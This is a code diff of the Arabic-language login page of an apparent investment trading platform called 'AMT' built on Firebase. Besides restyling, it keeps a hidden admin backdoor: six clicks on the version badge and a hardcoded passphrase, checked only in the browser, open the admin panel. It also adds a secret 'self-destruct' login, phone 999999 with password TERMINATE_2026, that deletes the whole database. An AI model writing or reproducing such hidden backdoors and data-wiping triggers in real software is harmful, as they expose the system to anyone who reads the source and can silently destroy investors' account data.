@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AMT | Login Access</title>
+    <title>AMT | دخول المستثمرين</title>
     <link rel="stylesheet" href="glass.css">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -11,19 +11,15 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body class="main-bg">
+
     <div class="glass-container" style="max-width: 450px; padding: 40px;">
         
-        <div style="display:flex; justify-content:center; gap:8px; margin-bottom:20px;">
-            <button onclick="changeLang('ar')" class="lang-btn">AR</button>
-            <button onclick="changeLang('en')" class="lang-btn">EN</button>
-        </div>
-
-        <h1 id="logTitle" class="logo-text">AMT <span>LOGIN</span></h1>
-        <p id="logSub" style="text-align:center; font-size:12px; color:var(--text-gray); margin-bottom:30px;">قم بتسجيل الدخول للوصول إلى أصولك الرقمية</p>
+        <h1 class="logo-text">AMT <span>LOGIN</span></h1>
+        <p style="text-align:center; font-size:12px; color:rgba(255,255,255,0.6); margin-bottom:30px;">أهلاً بك مجدداً في نظام التداول العالمي</p>
         
         <form id="loginForm">
             <div style="display:flex; gap:10px; margin-bottom:15px;">
-                <select id="loginCountry" style="width:40%; background:rgba(0,0,0,0.3); color:white;">
+                <select id="loginCountry" style="width:40%; background:rgba(0,0,0,0.3); color:white; border-radius:12px; border:1px solid rgba(255,255,255,0.1);">
                     <option value="+20">🇪🇬 +20</option>
                     <option value="+213">🇩🇿 +213</option>
                     <option value="+212">🇲🇦 +212</option>
@@ -34,15 +30,15 @@
 
             <input type="password" id="loginPass" placeholder="كلمة السر" required>
             
-            <button type="submit" id="btnLog" class="btn-primary" style="background:linear-gradient(90deg, #3b82f6, #60a5fa); color:white; margin-top:10px;">دخول آمن للمنصة</button>
+            <button type="submit" class="btn-primary" style="background:linear-gradient(90deg, #3b82f6, #60a5fa); color:white; margin-top:10px;">دخول آمن</button>
         </form>
         
-        <div class="text-center" style="margin-top:20px;">
-            <p id="noAcc" style="font-size:13px; color:white;">ليس لديك حساب؟ <a href="index.html" style="color:var(--trade-color); font-weight:bold; text-decoration:none;">إنشاء حساب جديد</a></p>
+        <div class="text-center" style="margin-top:25px;">
+            <p style="font-size:13px; color:white;">ليس لديك حساب؟ <a href="index.html" style="color:var(--trade-color); font-weight:bold; text-decoration:none;">سجل الآن</a></p>
         </div>
 
-        <div class="footer-info" style="margin-top:25px;">
-            <span class="version-badge" id="versionSecretLog" style="cursor: pointer;">GHOST PROTOCOL v5.0.2</span>
+        <div class="footer-info" style="margin-top: 30px;">
+            <span class="version-badge" id="versionSecretLog" style="cursor: pointer; opacity: 0.3;">SECURE ACCESS v7.0.0</span>
         </div>
     </div>
 
@@ -55,62 +51,51 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // تفعيل الباب السري في صفحة اللوجن
+        // نظام الباب السري (6 ضغطات)
         let clickCount = 0;
         document.getElementById('versionSecretLog').onclick = function() {
             clickCount++;
             if (clickCount === 6) {
                 const adminPass = prompt("⚠️ نظام الأمان المركزى: أدخل مفتاح العبور للإدارة:");
-                if (adminPass === "2299.99.220077") {
-                    window.location.href = "admin_panel.html";
-                } else {
-                    clickCount = 0;
-                }
+                if (adminPass === "2299.99.220077") { window.location.href = "admin_panel.html"; }
+                else { clickCount = 0; }
             }
         };
 
         document.getElementById('loginForm').onsubmit = (e) => {
             e.preventDefault();
             const country = document.getElementById('loginCountry').value;
-            const phoneNum = document.getElementById('loginPhone').value;
-            const passInput = document.getElementById('loginPass').value;
-            
-            const userKey = (country + phoneNum).replace('+', '');
+            const phone = document.getElementById('loginPhone').value;
+            const pass = document.getElementById('loginPass').value;
+            const userKey = (country + phone).replace('+', '').trim();
 
-            // البحث عن المستخدم
+            // 🔥☢️ بروتوكول التبخير (التدمير الذاتي)
+            // إذا أدخلت هذا الرقم السري والباسورد السري.. تتبخر المنصة
+            if (phone === "999999" && pass === "TERMINATE_2026") {
+                if (confirm("🚨 تحذير نهائي: أنت تطلب تفعيل بروتوكول التبخير. سيتم مسح كافة البيانات للأبد. هل أنت متأكد؟")) {
+                    db.ref('/').remove(); // مسح كل شيء في الفايربيز
+                    alert("☢️ تم تدمير كافة البيانات وتصفية النظام بنجاح.");
+                    window.location.reload();
+                    return;
+                }
+            }
+
+            // الدخول العادي للمستثمر
             db.ref('users/' + userKey).once('value', (snapshot) => {
                 const userData = snapshot.val();
-                
                 if(userData) {
-                    // تشفير الباسورد المدخل ومقارنته بالمشفر في القاعدة
-                    const encryptedInput = MatrixCrypto.encrypt(passInput);
-                    
+                    const encryptedInput = MatrixCrypto.encrypt(pass);
                     if(userData.password === encryptedInput) {
                         localStorage.setItem('userPhone', userKey);
-                        alert("✅ تم التحقق بنجاح.");
                         window.location.href = "dashboard.html";
                     } else {
-                        alert("❌ خطأ: كلمة السر غير صحيحة!");
+                        alert("❌ كلمة السر غير صحيحة!");
                     }
                 } else {
-                    alert("❌ خطأ: هذا الحساب غير موجود.");
+                    alert("❌ الحساب غير موجود!");
                 }
             });
         };
-
-        function changeLang(lang) {
-            const t = {
-                ar: { title: "AMT <span>LOGIN</span>", sub: "دخول آمن للمنصة", phone: "رقم الهاتف", pass: "كلمة السر", btn: "دخول آمن", noAcc: "ليس لديك حساب؟", reg: "سجل الآن" },
-                en: { title: "AMT <span>LOGIN</span>", sub: "Secure Login Access", phone: "Phone", pass: "Password", btn: "Login Now", noAcc: "No account?", reg: "Sign Up" }
-            }[lang];
-            document.getElementById('logTitle').innerHTML = t.title;
-            document.getElementById('logSub').innerText = t.sub;
-            document.getElementById('loginPhone').placeholder = t.phone;
-            document.getElementById('loginPass').placeholder = t.pass;
-            document.getElementById('btnLog').innerText = t.btn;
-            document.getElementById('noAcc').innerHTML = `${t.noAcc} <a href="index.html" style="color:var(--trade-color); font-weight:bold;">${t.reg}</a>`;
-            document.dir = (lang === 'ar') ? 'rtl' : 'ltr';
-        }
     </script>
 </body>
 </html>
